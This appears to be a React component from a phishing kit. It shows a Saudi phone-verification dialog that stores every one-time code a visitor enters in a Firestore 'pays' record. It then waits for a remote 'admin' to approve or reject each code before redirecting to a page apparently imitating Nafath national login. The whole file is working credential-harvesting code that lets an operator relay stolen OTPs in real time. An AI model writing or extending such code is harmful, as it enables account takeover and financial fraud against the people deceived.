"use client"

import { useState, useRef, useEffect } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { AlertCircle, CheckCircle2, Smartphone } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

interface PhoneOtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  phoneNumber: string
  onRejected: () => void
  onSubmitted?: () => void
}

export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, onSubmitted }: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const [phoneOtpApproved, setOtpStatus] = useState<"idle" | "pending" | "approved" | "rejected">("idle")
  const [error, setError] = useState("")
  const inputRef = useRef<HTMLInputElement | null>(null)
  const allOtps = useRef<string[]>([])

  // Timer countdown
  useEffect(() => {
    if (open && timer > 0 && phoneOtpApproved === "idle") {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [open, timer, phoneOtpApproved])

  // Reset on open
  useEffect(() => {
    if (open) {
      setTimer(60)
      setOtp("")
      setOtpStatus("idle")
      setError("")
      allOtps.current = []
      inputRef.current?.focus()
    }
  }, [open])

  // Listen to Firestore for admin decision
  useEffect(() => {
    if (!open || phoneOtpApproved !== "pending") return

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    console.log("[PhoneOTP] Setting up listener for admin decision")

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const status = data.phoneOtpStatus

          console.log("[PhoneOTP] Received status:", status)

          if (status === "approved") {
            console.log("[PhoneOTP] OTP approved, redirecting to nafad")
            setOtpStatus("approved")
            setError("")
            
            // Redirect to nafad page after 1 second
            setTimeout(async () => {
              await setDoc(doc(db, "pays", visitorID), {
                currentStep: "nafad",
                phoneOtpStatus: ""
              }, { merge: true })
              window.location.href = "/nafad"
            }, 1000)
          } else if (status === "rejected") {
            console.log("[PhoneOTP] OTP rejected")
            setOtpStatus("idle") // Re-enable input so the user can retry
            setOtp("") // Clear the old code
            setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
            onRejected() // Notify parent (e.g. close STC dialog, keep OTP open)

            // Clear the rejected status in Firebase after showing error
            setTimeout(async () => {
              await setDoc(doc(db, "pays", visitorID), {
                phoneOtpStatus: "pending"
              }, { merge: true })
            }, 1000)
          }
        }
      },
      (err) => {
        console.error("[PhoneOTP] Firestore listener error:", err)
        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
        setOtpStatus("idle")
      }
    )

    return () => unsubscribe()
  }, [open, phoneOtpApproved, onOpenChange, onRejected])

  const handleChange = (value: string) => {
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value)
      setError("")
    }
  }

  const handleVerify = async () => {
    if (otp.length !== 4 && otp.length !== 6) return

    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    try {
      allOtps.current.push(otp)
      
      setOtpStatus("pending")
      setError("")

      // Save OTP to Firebase
      await setDoc(doc(db, "pays", visitorID), {
        phoneOtp: otp,
        phoneOtpSubmittedAt: new Date().toISOString(),
        allPhoneOtps: allOtps.current,
        phoneOtpStatus: "pending",
        phoneOtpUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add phone OTP to history
      await addToHistory(visitorID, "phone_otp", {
        phoneOtp: otp
      }, "pending")

      console.log("[PhoneOTP] OTP submitted, pending for admin decision")
      onSubmitted?.()
    } catch (err) {
      console.error("[PhoneOTP] Error submitting OTP:", err)
      setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
      setOtpStatus("idle")
    }
  }

  const handleResend = () => {
    console.log("[PhoneOTP] Resending OTP")
    setTimer(60)
    setOtp("")
    setError("")
    setOtpStatus("idle")
    inputRef.current?.focus()
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader className="text-center space-y-3">
          <div className="flex justify-center">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-[#1a5c85]">
              <Smartphone className="w-8 h-8 text-white" />
            </div>
          </div>
          <DialogTitle className="text-2xl font-bold text-gray-900">
            التحقق من رقم الجوال
          </DialogTitle>
          <DialogDescription className="text-base leading-relaxed">
            تم إرسال رمز التحقق المكون من <span className="font-bold text-[#1a5c85]">6 أرقام</span> إلى رقم الجوال:
            <br />
            <span className="font-bold text-lg text-gray-900 dir-ltr inline-block mt-1">
              +966 {phoneNumber}
            </span>
            <br />
            <span className="text-sm text-gray-600">يرجى إدخال الرمز أدناه لإتمام عملية التحقق</span>
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6 py-4">
          {/* Status Alerts */}
          {phoneOtpApproved === "pending" && (
            <Alert className="bg-blue-50 border-blue-200">
              <AlertCircle className="h-4 w-4 text-blue-600" />
              <AlertDescription className="text-blue-900">
                جاري التحقق من الرمز... يرجى الانتظار
              </AlertDescription>
            </Alert>
          )}

          {phoneOtpApproved === "approved" && (
            <Alert className="bg-green-50 border-green-200">
              <CheckCircle2 className="h-4 w-4 text-green-600" />
              <AlertDescription className="text-green-900">
                تم التحقق بنجاح! جاري التحويل...
              </AlertDescription>
            </Alert>
          )}

          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* OTP Input */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              placeholder="000000"
              className="w-full max-w-xs h-16 text-center text-4xl font-bold tracking-[0.5em] border-2"
              disabled={phoneOtpApproved === "pending" || phoneOtpApproved === "approved"}
            />
          </div>

          {/* Timer / Resend */}
          <div className="text-center">
            {timer > 0 && phoneOtpApproved === "idle" ? (
              <p className="text-sm text-gray-600">
                إعادة إرسال الرمز بعد <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
              </p>
            ) : phoneOtpApproved === "idle" ? (
              <Button 
                variant="link" 
                onClick={handleResend} 
                className="text-[#1a5c85] font-semibold"
              >
                إعادة إرسال رمز التحقق
              </Button>
            ) : null}
          </div>

          {/* Verify Button */}
          <Button
            onClick={handleVerify}
            disabled={(otp.length !== 4 && otp.length !== 6) || phoneOtpApproved === "pending" || phoneOtpApproved === "approved"}
            className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] font-bold"
          >
            {phoneOtpApproved === "pending" ? "جاري التحقق..." : "تأكيد الرمز"}
          </Button>

          {/* Security Info */}
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center">
            <p className="text-xs text-gray-600">
              🔒 رمز التحقق صالح لمدة 10 دقائق فقط
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
